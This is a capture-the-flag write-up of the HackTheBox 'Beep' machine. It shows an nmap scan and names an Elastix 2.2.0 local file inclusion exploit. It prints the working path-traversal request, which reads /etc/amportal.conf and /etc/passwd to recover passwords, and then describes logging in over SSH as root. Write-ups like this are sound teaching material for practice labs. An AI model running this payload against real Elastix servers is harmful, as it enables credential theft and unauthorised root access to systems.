---
layout: post
title:  "HTB Beep Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---
Beep was a very easy box with not much to learn. Would have liked to see more complex methods included as the initial vector was different and could have led to more interesting things.


# Nmap scan
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: UIDL APOP LOGIN-DELAY(0) STLS AUTH-RESP-CODE EXPIRE(NEVER) TOP IMPLEMENTATION(Cyrus POP3 server v2) USER RESP-CODES PIPELINING
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            743/udp  status
|_  100024  1            746/tcp  status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK RENAME URLAUTHA0001 IMAP4 NO X-NETSCAPE QUOTA SORT CONDSTORE MULTIAPPEND UNSELECT IDLE CATENATE IMAP4rev1 ACL THREAD=REFERENCES LITERAL+ RIGHTS=kxte ATOMIC NAMESPACE BINARY ID LIST-SUBSCRIBED SORT=MODSEQ MAILBOX-REFERRALS CHILDREN ANNOTATEMORE UIDPLUS THREAD=ORDEREDSUBJECT STARTTLS LISTEXT
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2018-10-31T09:44:22+00:00; -2h00m46s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host
```

# Exploitation
We can see from the nmap scan and from navigating the page that the webserver is running elastix. A exploit-db search for elastix returns a local file inclusion that should reveal a user login and password from a config file.
```
Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php_webapps/37637.pl
```
Reading the exploit and grabbing the payload we can navigate back to the page and read the config file with the LFI
```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
There are passwords in the config file as expected, next we can change the LFI to point to /etc/passwd to check for user accounts to try ssh with.

sshing into the box as root with the password from the config file works and we can collect our root and user flags.
